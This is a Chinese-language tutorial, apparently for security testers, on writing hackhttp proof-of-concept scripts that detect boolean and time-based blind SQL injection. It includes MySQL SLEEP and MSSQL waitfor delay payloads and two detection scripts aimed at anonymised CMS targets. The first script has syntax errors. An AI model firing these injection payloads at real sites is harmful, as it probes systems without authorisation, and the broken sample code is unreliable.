各位白帽子，大家好。今天我们来分享如何用hackhttp来实现时间跟布尔盲注poc的精准检测。

首先明确一点，盲注是不能通过显示的途径获取数据库的数据信息。并且通常位于UPDATE或者INSERT语句中，此时提交的信息虽然被写入数据库中且不产生输出，但是会产生通用的错误。

在盲注中，我们根据返回页面的不同来判断信息。分为布尔盲注跟时间盲注。

布尔盲注类

这一类的注入在返回页面中没有回显，但是可以根据返回页面的结果判断构造的SQL语句的真假性。

那么如何使用hackhttp形成精准的时间盲注的检查，先来看个样例:

某cms xxx文件 sql注入漏洞

#!/usr/bin/env python
# -*- coding: utf-8 -*-


def assign(service, arg):
    if service == fingerprint.xxcms:
        return True, arg

def audit(arg):

    payload_true=index.php?lang=cn&class2=5&serch_sql=123qwe where 4343=4343 --

    payload_false=news.php?lang=cn&class2=5&serch_sql=123qwe where 4343=4344 --

    try:
        code1, head1, body1, redirect_url1, log1 = hackhttp.http(payload_true)

        code2, head2, body2, redirect_url2, log2 = hackhttp.http(payload_false)

        code3, head3, body3, redirect_url3, log3 = hackhttp.http(payload_false)

    if code1==200 and code2==200 and code3==200:
        if body1!=body2 and body2==body3 and 'xxx' in body1 and 'yyy' in body2:
        print "success"
    except Expection as e:
        print e

if '__name__'=='__main__':
    from dummy import *
    audit(assign(fingerprint.xxcms, 'http://127.0.0.1/')[1])

从以上的脚本检查可以看出，针对payload_fase我们做了两次请求，判断的依据也是十分严格。

body1!=body2 and body2==body3 and 'xxx' in body1 and 'yyy' in body2

时间盲注类

在我们注入payload之后，如果影响到后台数据库的正常功能，但是此时web页面依旧显示正常。这个时候，你可能会问，到底注入的sql代码有没有被执行。面对这种情况，布尔盲注的很难发挥作用。此时就需要时间盲注现身了。

跟布尔不同的是，时间盲注是通过页面返回的时间长短进行判断。

主要影响因素:网络。

MYSQL

使用sleep()函数达到延时。

其实BENCHMARK()函数也可以达到效果，但是因为消耗CPU太大，不推荐使用。

SELECT IF(1=1, sleep(5), "1");

SELECT IF(1=2, sleep(5), "1");

具体IF语句怎么理解，上一篇已经分享过。

MSSQL

使用 waitfor delay 达到延时。

waitfor是一个流程控制语句。作用就是等待特定时间，然后执行后边的语句。delay用来指定等待的时间。

waitfor delay '0:0:5'--

如何提高该类注入的准确性，依然来看样例:

#!/usr/bin/env python
# -*- coding: utf-8 -*-

import time

def assign(service, arg):
    if service == fingerprint.yycms:
        return True, arg

def time_sql(arg):
    payload = "%20AND%20SLEEP%285%29"
    url = arg+"index.php?id=1"
    start_time = time.time()
    ture_code, head, res, final_url, log= hackhttp.http(url)
    ture_time = time.time()- start_time
    start_time = time.time()
    false_code, head, res, final_url, log= hackhttp.http(url+payload)
    false_time = time.time()- start_time
    if false_code == 200 and ture_code ==200 and false_time -ture_time >4:
       return url,log,True

def audit(arg):
    check = True
    for i in xrange(3):
        if check:
            res = time_sql(arg)
            check = check and res[2]
    if check:
        print "success"

if __name__ == '__main__':
    from dummy import *
    audit(assign(fingerprint.yycms, "http://127.0.0.1/")[1])

常规的时间注入类检测一次，由于网络等其他因素的干涉，可能会对结果造成直接的影响。但是我们的例子中的思路是将结果保存起来，使用循环数控制最大检测次数，如果有一次不满足if判断，那证明漏洞不存在。

是不是很简单，是不是很精准？那就对了。快拿起hackhttp跑车实践起来。
